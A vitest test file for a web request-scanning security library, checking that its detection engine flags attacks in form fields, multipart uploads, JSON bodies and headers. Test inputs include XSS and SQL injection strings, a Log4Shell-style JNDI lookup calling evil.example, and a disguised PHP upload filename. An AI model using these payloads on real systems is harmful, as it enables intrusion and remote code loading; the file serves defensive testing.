import { describe, it, expect } from 'vitest';
import { deflateSync } from 'node:zlib';

import { SecurityConfigSchema } from '../../src/models/config.js';
import { defaultLogger } from '../../src/models/logger.js';
import { scanRequestWithManager } from '../../src/utils.js';
import { createTestConfig, createMockRequest } from '../helpers.js';
import type { GuardRequest } from '../../src/protocols/request.js';
import type { SusPatternsManager } from '../../src/handlers/sus-patterns.js';

const MULTIPART_CONTENT_TYPE = 'multipart/form-data; boundary=B0';

/** Seeded uniform byte stream, mirroring the Python tests' _noise_bytes. */
function noiseBytes(seed: number, size: number): Uint8Array {
  let state = seed >>> 0;
  const out = new Uint8Array(size);
  for (let i = 0; i < size; i++) {
    state = (Math.imul(state, 1103515245) + 12345) >>> 0;
    out[i] = state & 0xff;
  }
  return out;
}

/** zlib level 9 over random bytes, mirroring _compressed_bytes: the result
 *  is binary-dense under the engine's string model. */
function compressedBytes(seed: number, size: number): Uint8Array {
  return deflateSync(noiseBytes(seed, size), { level: 9 });
}

function concatBytes(...chunks: Uint8Array[]): Uint8Array {
  const total = chunks.reduce((sum, c) => sum + c.length, 0);
  const out = new Uint8Array(total);
  let offset = 0;
  for (const chunk of chunks) {
    out.set(chunk, offset);
    offset += chunk.length;
  }
  return out;
}

function filePartBody(filename: string, content: Uint8Array, withContentType = true): Uint8Array {
  const head = new TextEncoder().encode(
    `--B0\r\nContent-Disposition: form-data; name="upload"; filename="${filename}"\r\n` +
    (withContentType ? 'Content-Type: application/octet-stream\r\n' : '') +
    '\r\n',
  );
  const tail = new TextEncoder().encode('\r\n--B0--\r\n');
  return concatBytes(head, content, tail);
}

function textPartBody(name: string, content: string): Uint8Array {
  return new TextEncoder().encode(
    `--B0\r\nContent-Disposition: form-data; name="${name}"\r\n\r\n${content}\r\n--B0--\r\n`,
  );
}

async function makeManager(configOverrides: Record<string, unknown> = {}): Promise<SusPatternsManager> {
  const { SusPatternsManager } = await import('../../src/handlers/sus-patterns.js');
  return new SusPatternsManager(createTestConfig(configOverrides), defaultLogger);
}

function bodyRequest(headers: Record<string, string>, body: Uint8Array): GuardRequest {
  return createMockRequest({
    method: 'POST',
    headers,
    body: async () => body,
  });
}

describe('body surface routing through the live engine', () => {
  it('detects sqli carried in a urlencoded form field', async () => {
    const manager = await makeManager();
    const [isThreat, info] = await scanRequestWithManager(
      manager,
      bodyRequest(
        { 'content-type': 'application/x-www-form-urlencoded' },
        new TextEncoder().encode('q=1+OR+1%3D1&note=benign'),
      ),
    );
    expect(isThreat).toBe(true);
    expect(info).toContain("Request body field 'q':");
  });

  it('detects an attack embedded in a JSON form field under the :embedded_json context', async () => {
    const manager = await makeManager();
    const [isThreat, info] = await scanRequestWithManager(
      manager,
      bodyRequest(
        { 'content-type': 'application/x-www-form-urlencoded' },
        new TextEncoder().encode('data=%7B%22a%22%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%7D'),
      ),
    );
    expect(isThreat).toBe(true);
    expect(info).toContain("Request body field 'a':");
  });

  it('labels embedded JSON leaves with the :embedded_json context suffix', async () => {
    const manager = await makeManager();
    const seen: Array<{ context: string; content: string }> = [];
    const stub = {
      detect: async (content: string, _ip: string, context: string) => {
        seen.push({ context, content });
        return {
          isThreat: false, threatScore: 0, threats: [], executionTime: 0,
          timeouts: [], correlationId: null, originalLength: 1, processedLength: 1,
        };
      },
    } as unknown as SusPatternsManager;
    await scanRequestWithManager(
      stub,
      bodyRequest(
        { 'content-type': 'application/x-www-form-urlencoded' },
        new TextEncoder().encode('data={"a":"leaf"}'),
      ),
    );
    const leaf = seen.find((entry) => entry.content === 'leaf');
    expect(leaf?.context).toBe('request_body:form_field:embedded_json');
  });

  it('scans a plain multipart text part through the multipart context', async () => {
    const manager = await makeManager();
    const [isThreat, info] = await scanRequestWithManager(
      manager,
      bodyRequest({ 'content-type': MULTIPART_CONTENT_TYPE }, textPartBody('note', '<script>alert(1)</script>')),
    );
    expect(isThreat).toBe(true);
    expect(info).toContain("Request body field 'note':");
  });

  it('detects a malicious upload filename alongside harmless content', async () => {
    const manager = await makeManager();
    const [isThreat, info] = await scanRequestWithManager(
      manager,
      bodyRequest(
        { 'content-type': MULTIPART_CONTENT_TYPE },
        filePartBody('shell.php.jpg', new TextEncoder().encode('harmless-bytes')),
      ),
    );
    expect(isThreat).toBe(true);
    expect(info).toContain("Request body field 'upload':");
    expect(info).toContain('filename');
  });

  it('detects an attack in the multipart field NAME', async () => {
    const manager = await makeManager();
    const [isThreat, info] = await scanRequestWithManager(
      manager,
      bodyRequest(
        { 'content-type': MULTIPART_CONTENT_TYPE },
        new TextEncoder().encode(
          '--B0\r\nContent-Disposition: form-data; name="<img src=x onerror=alert(1)>"\r\n\r\nbenign\r\n--B0--\r\n',
        ),
      ),
    );
    expect(isThreat).toBe(true);
    expect(info).toContain('Multipart field name');
  });

  it('detects an intact script island inside a binary-dense file part', async () => {
    const manager = await makeManager();
    const payload = concatBytes(
      compressedBytes(12, 4096),
      new Uint8Array([0]),
      new TextEncoder().encode('<script>alert(1)</script>'),
      new Uint8Array([0]),
      compressedBytes(13, 4096),
    );
    const [isThreat] = await scanRequestWithManager(
      manager,
      bodyRequest({ 'content-type': MULTIPART_CONTENT_TYPE }, filePartBody('page.html.bin', payload)),
    );
    expect(isThreat).toBe(true);
  });

  it('does not detect a short smuggled fragment inside compressed upload bytes', async () => {
    const manager = await makeManager();
    const payload = concatBytes(
      compressedBytes(11, 4096),
      new Uint8Array([0]),
      new TextEncoder().encode('1 OR 1=1'),
      new Uint8Array([0]),
    );
    const [isThreat] = await scanRequestWithManager(
      manager,
      bodyRequest({ 'content-type': MULTIPART_CONTENT_TYPE }, filePartBody('installer.zip', payload)),
    );
    expect(isThreat).toBe(false);
  });

  it('does not let a pattern span two separate islands', async () => {
    const manager = await makeManager();
    const payload = concatBytes(
      compressedBytes(17, 4096),
      new Uint8Array([0]),
      new TextEncoder().encode('choose one: SELECT'),
      new Uint8Array([0]),
      new TextEncoder().encode('* FROM xYYYYYYYYYY'),
      new Uint8Array([0]),
    );
    const [isThreat] = await scanRequestWithManager(
      manager,
      bodyRequest({ 'content-type': MULTIPART_CONTENT_TYPE }, filePartBody('dump.bin', payload)),
    );
    expect(isThreat).toBe(false);
  });

  it('produces no noise from benign binary uploads', async () => {
    const manager = await makeManager();
    for (const [filename, content] of [
      ['photo.bin', noiseBytes(6, 4000)],
      ['blob.bin', new Uint8Array(4000).fill(0)],
    ] as const) {
      const [isThreat] = await scanRequestWithManager(
        manager,
        bodyRequest({ 'content-type': MULTIPART_CONTENT_TYPE }, filePartBody(filename, content)),
      );
      expect(isThreat, filename).toBe(false);
    }
  });

  it('honors a raised detectionBinaryMinRunLength end to end', async () => {
    const payload = concatBytes(
      compressedBytes(21, 4096),
      new Uint8Array([0]),
      new TextEncoder().encode('<script>alert(1)</script>'),
      new Uint8Array([0]),
    );
    const defaultManager = await makeManager();
    const [defaultThreat] = await scanRequestWithManager(
      defaultManager,
      bodyRequest({ 'content-type': MULTIPART_CONTENT_TYPE }, filePartBody('dump.bin', payload)),
    );
    expect(defaultThreat).toBe(true);

    const raisedManager = await makeManager({ detectionBinaryMinRunLength: 1024 });
    const [raisedThreat] = await scanRequestWithManager(
      raisedManager,
      bodyRequest({ 'content-type': MULTIPART_CONTENT_TYPE }, filePartBody('dump.bin', payload)),
    );
    expect(raisedThreat).toBe(false);
  });

  it('falls back to the whole-body blob scan when the boundary never matches', async () => {
    const manager = await makeManager();
    const raw = '--B0\r\nContent-Disposition: form-data; name="file"\r\n\r\n<script>alert(1)</script>\r\n--B0--\r\n';
    const [isThreat, info] = await scanRequestWithManager(
      manager,
      bodyRequest({ 'content-type': 'multipart/form-data; boundary=DOES-NOT-MATCH' }, new TextEncoder().encode(raw)),
    );
    expect(isThreat).toBe(true);
    expect(info).toContain('Request body:');
  });

  it('keeps the multipart scan inside the scan-value budget', async () => {
    const manager = await makeManager();
    const chunks: string[] = [];
    for (let i = 0; i < 200; i++) {
      chunks.push(
        `--B0\r\nContent-Disposition: form-data; name="field${i}"\r\n\r\nbenign\r\n`,
      );
    }
    chunks.push(
      '--B0\r\nContent-Disposition: form-data; name="evil"\r\n\r\n<img src=x onerror=alert(1)>\r\n--B0--\r\n',
    );
    const [isThreat] = await scanRequestWithManager(
      manager,
      bodyRequest({ 'content-type': MULTIPART_CONTENT_TYPE }, new TextEncoder().encode(chunks.join(''))),
    );
    expect(isThreat).toBe(false);

    const shortManager = await makeManager();
    const [shortThreat] = await scanRequestWithManager(
      shortManager,
      bodyRequest({ 'content-type': MULTIPART_CONTENT_TYPE }, textPartBody('evil', '<img src=x onerror=alert(1)>')),
    );
    expect(shortThreat).toBe(true);
  });
});

describe('recon gate and raw-view semantics for form fields', () => {
  it('does not flag the bare word default in a form field', async () => {
    const manager = await makeManager();
    const [isThreat] = await scanRequestWithManager(
      manager,
      bodyRequest(
        { 'content-type': 'application/x-www-form-urlencoded' },
        new TextEncoder().encode('page=default'),
      ),
    );
    expect(isThreat).toBe(false);
  });

  it('flags a separator-prefixed recon probe in a form field', async () => {
    const manager = await makeManager();
    const [isThreat] = await scanRequestWithManager(
      manager,
      bodyRequest(
        { 'content-type': 'application/x-www-form-urlencoded' },
        new TextEncoder().encode('page=/default'),
      ),
    );
    expect(isThreat).toBe(true);
  });

  /* The recon bare-word gate accepts a `\default` probe (the matched value
     starts with a backslash). The configured preprocessing pipeline folds the
     LDAP hex escape `\de` into `Þ` before the recon rows run, so detection
     rides on the raw-view recon membership (guard-core commit 81cf07f1): the
     recon rows join the signal-preserving raw view and the probe fires
     through the form-field scan. */
  it('flags a backslash-prefixed recon probe in a form field', async () => {
    const manager = await makeManager();
    const [isThreat] = await scanRequestWithManager(
      manager,
      bodyRequest(
        { 'content-type': 'application/x-www-form-urlencoded' },
        new TextEncoder().encode('page=%5Cdefault'),
      ),
    );
    expect(isThreat).toBe(true);
  });
});

describe('detectionBinaryMinRunLength config validation', () => {
  it('defaults to 16', () => {
    expect(SecurityConfigSchema.parse({}).detectionBinaryMinRunLength).toBe(16);
  });

  it('rejects values outside [4, 1024]', () => {
    expect(() => SecurityConfigSchema.parse({ detectionBinaryMinRunLength: 3 })).toThrow();
    expect(() => SecurityConfigSchema.parse({ detectionBinaryMinRunLength: 1025 })).toThrow();
  });

  it('accepts boundary values', () => {
    expect(SecurityConfigSchema.parse({ detectionBinaryMinRunLength: 4 }).detectionBinaryMinRunLength).toBe(4);
    expect(SecurityConfigSchema.parse({ detectionBinaryMinRunLength: 1024 }).detectionBinaryMinRunLength).toBe(1024);
  });

  it('is exposed by the manager for the scan routing', async () => {
    const manager = await makeManager({ detectionBinaryMinRunLength: 32 });
    expect(manager.detectionBinaryMinRunLength).toBe(32);
  });
});

describe('excluded detection fields config (guard-core parity)', () => {
  const SCRIPT = '<script>alert(1)</script>';
  const JSON_CT = 'application/json';
  const FORM_CT = 'application/x-www-form-urlencoded';

  it('defaults both exclusion sets to empty', () => {
    const parsed = SecurityConfigSchema.parse({});
    expect(parsed.excludedDetectionParams).toEqual([]);
    expect(parsed.excludedDetectionBodyFields).toEqual([]);
  });

  it('skips an excluded query parameter entirely while siblings still scan', async () => {
    const manager = await makeManager();
    const config = createTestConfig({ excludedDetectionParams: ['search'] });
    const [excludedHit] = await scanRequestWithManager(
      manager,
      createMockRequest({ queryParams: { search: SCRIPT } }),
      config,
    );
    expect(excludedHit).toBe(false);

    const [siblingHit] = await scanRequestWithManager(
      manager,
      createMockRequest({ queryParams: { search: 'benign', note: SCRIPT } }),
      config,
    );
    expect(siblingHit).toBe(true);
  });

  it('matches entries case-insensitively (names and entries lowercase, like the reference _resolve_excluded_params)', async () => {
    const manager = await makeManager();
    const [suppressed] = await scanRequestWithManager(
      manager,
      createMockRequest({ queryParams: { SEARCH: SCRIPT } }),
      createTestConfig({ excludedDetectionParams: ['search'] }),
    );
    expect(suppressed).toBe(false);

    // The entry itself is lowercased by the exclusion resolver
    // (resolveDetectionExclusions), so an uppercase entry suppresses the
    // lowercase query param too.
    const [alsoSuppressed] = await scanRequestWithManager(
      manager,
      createMockRequest({ queryParams: { search: SCRIPT } }),
      createTestConfig({ excludedDetectionParams: ['SEARCH'] }),
    );
    expect(alsoSuppressed).toBe(false);
  });

  it('keeps param and body-field exclusions on their own surfaces', async () => {
    const manager = await makeManager();
    const jsonBody = new TextEncoder().encode(JSON.stringify({ search: SCRIPT }));

    const [bodyStillScanned] = await scanRequestWithManager(
      manager,
      bodyRequest({ 'content-type': JSON_CT }, jsonBody),
      createTestConfig({ excludedDetectionParams: ['search'] }),
    );
    expect(bodyStillScanned).toBe(true);

    const [queryStillScanned] = await scanRequestWithManager(
      manager,
      createMockRequest({ queryParams: { search: SCRIPT } }),
      createTestConfig({ excludedDetectionBodyFields: ['search'] }),
    );
    expect(queryStillScanned).toBe(true);
  });

  it('skips an excluded JSON key and its whole subtree, siblings still scan', async () => {
    const manager = await makeManager();
    const config = createTestConfig({ excludedDetectionBodyFields: ['content'] });

    const [nestedExcluded] = await scanRequestWithManager(
      manager,
      bodyRequest(
        { 'content-type': JSON_CT },
        new TextEncoder().encode(JSON.stringify({ messages: [{ role: 'user', content: SCRIPT }] })),
      ),
      config,
    );
    expect(nestedExcluded).toBe(false);

    const [nonExcluded] = await scanRequestWithManager(
      manager,
      bodyRequest(
        { 'content-type': JSON_CT },
        new TextEncoder().encode(JSON.stringify({ outer: { note: SCRIPT } })),
      ),
      config,
    );
    expect(nonExcluded).toBe(true);

    const [siblingScanned] = await scanRequestWithManager(
      manager,
      bodyRequest(
        { 'content-type': JSON_CT },
        new TextEncoder().encode(JSON.stringify({ content: SCRIPT, note: SCRIPT })),
      ),
      config,
    );
    expect(siblingScanned).toBe(true);

    const [arrayRecursed] = await scanRequestWithManager(
      manager,
      bodyRequest(
        { 'content-type': JSON_CT },
        new TextEncoder().encode(JSON.stringify([{ note: SCRIPT }])),
      ),
      createTestConfig({ excludedDetectionBodyFields: ['safe'] }),
    );
    expect(arrayRecursed).toBe(true);
  });

  it('skips an excluded urlencoded pair while other fields still scan', async () => {
    const manager = await makeManager();
    const form = new TextEncoder().encode(`message=${encodeURIComponent(SCRIPT)}&other=hi`);

    const [excludedField] = await scanRequestWithManager(
      manager,
      bodyRequest({ 'content-type': FORM_CT }, form),
      createTestConfig({ excludedDetectionBodyFields: ['message'] }),
    );
    expect(excludedField).toBe(false);

    const [siblingField] = await scanRequestWithManager(
      manager,
      bodyRequest({ 'content-type': FORM_CT }, form),
      createTestConfig({ excludedDetectionBodyFields: ['other'] }),
    );
    expect(siblingField).toBe(true);
  });

  it('skips excluded multipart parts but never a part without a name', async () => {
    const manager = await makeManager();

    const [excludedTextPart] = await scanRequestWithManager(
      manager,
      bodyRequest({ 'content-type': MULTIPART_CONTENT_TYPE }, textPartBody('note', SCRIPT)),
      createTestConfig({ excludedDetectionBodyFields: ['note'] }),
    );
    expect(excludedTextPart).toBe(false);

    const [otherTextPart] = await scanRequestWithManager(
      manager,
      bodyRequest({ 'content-type': MULTIPART_CONTENT_TYPE }, textPartBody('note', SCRIPT)),
      createTestConfig({ excludedDetectionBodyFields: ['other'] }),
    );
    expect(otherTextPart).toBe(true);

    const [excludedFilePart] = await scanRequestWithManager(
      manager,
      bodyRequest(
        { 'content-type': MULTIPART_CONTENT_TYPE },
        filePartBody('a.txt', new TextEncoder().encode(SCRIPT)),
      ),
      createTestConfig({ excludedDetectionBodyFields: ['upload'] }),
    );
    expect(excludedFilePart).toBe(false);

    const [unnamedPart] = await scanRequestWithManager(
      manager,
      bodyRequest(
        { 'content-type': MULTIPART_CONTENT_TYPE },
        new TextEncoder().encode(`--B0\r\nContent-Disposition: form-data\r\n\r\n${SCRIPT}\r\n--B0--\r\n`),
      ),
      createTestConfig({ excludedDetectionBodyFields: ['file'] }),
    );
    expect(unnamedPart).toBe(true);
  });

  it('still scans the raw query value when every embedded leaf is excluded', async () => {
    // Reference semantics verified against the engine (defense in depth):
    // the excluded body field shapes the embedded walk, but the raw value
    // itself still scans afterwards, so a query JSON whose only key is
    // excluded still detects through the raw text.
    const manager = await makeManager();
    const config = createTestConfig({ excludedDetectionBodyFields: ['search'] });

    const [excludedLeafOnly] = await scanRequestWithManager(
      manager,
      createMockRequest({ queryParams: { v: JSON.stringify({ search: SCRIPT }) } }),
      config,
    );
    expect(excludedLeafOnly).toBe(true);

    const [siblingLeaf] = await scanRequestWithManager(
      manager,
      createMockRequest({ queryParams: { v: JSON.stringify({ search: SCRIPT, note: SCRIPT }) } }),
      config,
    );
    expect(siblingLeaf).toBe(true);
  });

  it('keeps current behavior when no exclusions are configured', async () => {
    const manager = await makeManager();
    const [jsonHit] = await scanRequestWithManager(
      manager,
      bodyRequest(
        { 'content-type': JSON_CT },
        new TextEncoder().encode(JSON.stringify({ search: SCRIPT })),
      ),
    );
    expect(jsonHit).toBe(true);

    const [queryHit] = await scanRequestWithManager(
      manager,
      createMockRequest({ queryParams: { search: SCRIPT } }),
    );
    expect(queryHit).toBe(true);
  });
});

describe('excluded detection headers (guard-core parity)', () => {
  const SCRIPT = '<script>alert(1)</script>';
  const JNDI = '${jndi:ldap://evil.example/a}';
  const SQLI = "203.0.113.10' OR '1'='1'";
  const headerRequest = (headers: Record<string, string>) =>
    createMockRequest({ headers });

  it('defaults the header exclusion set to empty', () => {
    const parsed = SecurityConfigSchema.parse({});
    expect(parsed.excludedDetectionHeaders).toEqual([]);
  });

  it('does not flag address-carrying proxy identity headers by default', async () => {
    const manager = await makeManager();
    for (const headers of [
      { 'x-forwarded-for': '192.168.65.1' },
      { 'x-real-ip': '10.0.0.5, 172.16.0.1' },
      { 'cf-connecting-ip': '127.0.0.1' },
      { 'x-envoy-external-address': '127.0.0.1:8080' },
      { host: '169.254.169.254' },
    ]) {
      const [isThreat] = await scanRequestWithManager(manager, headerRequest(headers));
      expect(isThreat).toBe(false);
    }
  });

  it('does not flag structured proxy header values by default', async () => {
    const manager = await makeManager();
    for (const headers of [
      { forwarded: 'for=127.0.0.1;proto=https' },
      { 'x-forwarded-proto': 'https' },
    ]) {
      const [isThreat] = await scanRequestWithManager(manager, headerRequest(headers));
      expect(isThreat).toBe(false);
    }
  });

  it('still scans excluded headers for always-scan and per-category payloads', async () => {
    const manager = await makeManager();
    for (const headers of [
      { 'x-forwarded-for': JNDI },
      { 'user-agent': JNDI },
      { 'x-real-ip': JNDI },
      { 'x-forwarded-for': SQLI },
      { 'user-agent': SCRIPT },
    ]) {
      const [isThreat] = await scanRequestWithManager(manager, headerRequest(headers));
      expect(isThreat).toBe(true);
    }
  });

  it('keeps the full category scan on non-excluded headers', async () => {
    const manager = await makeManager();
    const [ssrfHit] = await scanRequestWithManager(
      manager,
      headerRequest({ 'x-not-a-proxy-header': '192.168.65.1' }),
    );
    expect(ssrfHit).toBe(true);

    const [sqliHit] = await scanRequestWithManager(
      manager,
      headerRequest({ 'x-plain-header': "1 UNION SELECT username, password FROM users--" }),
    );
    expect(sqliHit).toBe(true);
  });

  it('configured exclusions suppress ssrf only', async () => {
    const manager = await makeManager();
    const config = createTestConfig({ excludedDetectionHeaders: ['x-custom-proxy-ip'] });

    const [addressSuppressed] = await scanRequestWithManager(
      manager,
      headerRequest({ 'x-custom-proxy-ip': '10.0.0.5' }),
      config,
    );
    expect(addressSuppressed).toBe(false);

    const [chainSuppressed] = await scanRequestWithManager(
      manager,
      headerRequest({ 'x-custom-proxy-ip': '10.0.0.5, 172.16.0.1' }),
      config,
    );
    expect(chainSuppressed).toBe(false);

    for (const headers of [
      { 'x-custom-proxy-ip': SCRIPT },
      { 'x-custom-proxy-ip': JNDI },
      { 'x-other-header': '192.168.65.1' },
    ]) {
      const [isThreat] = await scanRequestWithManager(manager, headerRequest(headers), config);
      expect(isThreat).toBe(true);
    }

    const [unconfigured] = await scanRequestWithManager(
      manager,
      headerRequest({ 'x-custom-proxy-ip': '10.0.0.5' }),
    );
    expect(unconfigured).toBe(true);
  });

  it('empty exclusion config keeps the ordinary header scan', async () => {
    const manager = await makeManager();
    const [isThreat] = await scanRequestWithManager(
      manager,
      headerRequest({ 'x-plain-header': SCRIPT }),
      createTestConfig({}),
    );
    expect(isThreat).toBe(true);
  });
});
